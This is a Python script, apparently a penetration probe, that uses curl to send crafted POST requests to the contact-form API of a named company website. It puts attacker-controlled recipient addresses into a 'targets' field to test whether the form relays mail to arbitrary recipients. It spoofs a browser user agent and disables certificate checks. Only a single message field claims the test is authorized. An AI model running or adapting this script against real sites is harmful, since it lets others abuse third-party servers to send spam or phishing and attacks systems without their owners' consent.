import subprocess, json

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
EP = 'https://www.infinitycapital.bh/api/send'


def post(fields, tag):
    cmd = ['curl', '-s', '-k', '-m', '40', '-A', UA, '-X', 'POST',
           '-o', '/tmp/rb_%s' % tag, '-w', 'code=%{http_code} len=%{size_download}']
    for k, v in fields:
        cmd += ['-F', '%s=%s' % (k, v)]
    cmd += [EP]
    r = subprocess.run(cmd, capture_output=True, text=True)
    body = open('/tmp/rb_%s' % tag, 'rb').read()[:400]
    print('== %-22s %s' % (tag, r.stdout))
    print('   body:', body)
    return r.stdout, body


base = [('fname', 'Probe'), ('lname', 'User'), ('areacode', '973'), ('tel', '3000000'),
        ('cname', 'probe@attacker.invalid'), ('subject', 'General Inquiry'),
        ('msg', 'd14 authorized relay test'), ('check', '')]

# valid-format attacker-supplied recipient in targets
post(base + [('targets', 'relay-probe@attacker.invalid')], 'valid_one')

# multiple recipients
post(base + [('targets', 'a@attacker.invalid,b@attacker.invalid')], 'valid_two')

# the app's own address -> is it the real `to`?
post(base + [('targets', 'info@infinitycapital.bh')], 'victim_domain')
